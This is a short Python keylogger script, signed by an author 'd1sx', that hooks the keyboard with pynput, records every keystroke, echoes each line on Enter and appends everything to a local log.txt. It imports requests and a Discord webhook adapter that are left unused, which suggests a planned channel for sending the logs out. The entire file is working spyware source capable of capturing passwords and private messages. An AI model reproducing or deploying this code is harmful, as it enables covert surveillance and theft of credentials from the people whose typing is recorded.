#!/bin/python3

from pynput.keyboard import Listener
import re, requests
from discord import Webhook, RequestsWebhookAdapter

keys = []; ksksks = ['Key.right', 'Key.down', 'Key.left', 'Key.esc', 'Key.caps_lock', 'Key.alt', 'Key.up', 'Key.ctrl', 'Key.shift', 'Key.tab']
print('Captura de teclas iniciada!')
def cap(key):
    key = str(key); key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.enter', '\n[Enter]\n', key)
    key = re.sub(r'Key.backspace', '[ backspace ]', key) 
    for l in ksksks:
    	key = re.sub(l, '', key)
    key = re.sub(r'Key.space', ' ', key); keys.append(key)
    if key == '\n[Enter]\n':
        for i in keys:
            print(i, end='')
        keys.clear()

    with open("log.txt", "a") as log:
	    log.write(key)

with Listener(on_press=cap) as l:
    l.join()


###################
# author: d1sx    #
# date: 27/8/2021 #
###################
